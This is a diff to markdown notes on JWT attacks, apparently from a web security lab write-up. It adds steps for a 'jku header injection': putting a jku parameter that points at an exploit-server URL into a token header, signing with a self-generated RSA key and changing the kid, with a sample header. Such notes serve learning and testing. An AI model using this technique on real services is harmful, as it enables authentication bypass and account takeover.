@@ -37,7 +37,15 @@ Total attempts: 20000
 }
 ```
 
-5. `jku header injection` - A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.
+5. `jku header injection` - A JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below. Add the jku paramter in header part of jwt and sign the jwt with the generated RSA key, also change the `kid` if it's already there in header.
+
+```json
+{
+    "kid": "240c7c33-0eb9-46a6-bc2d-650db9188d6f",
+    "alg": "RS256",
+    "jku": "https://exploit-0ab2008a0391a2ea878b626601c2009c.exploit-server.net/exploit"
+}
+```
 
 ```json
 {
@@ -57,3 +65,5 @@ Total attempts: 20000
     ]
 }
 ```
+
+6. 
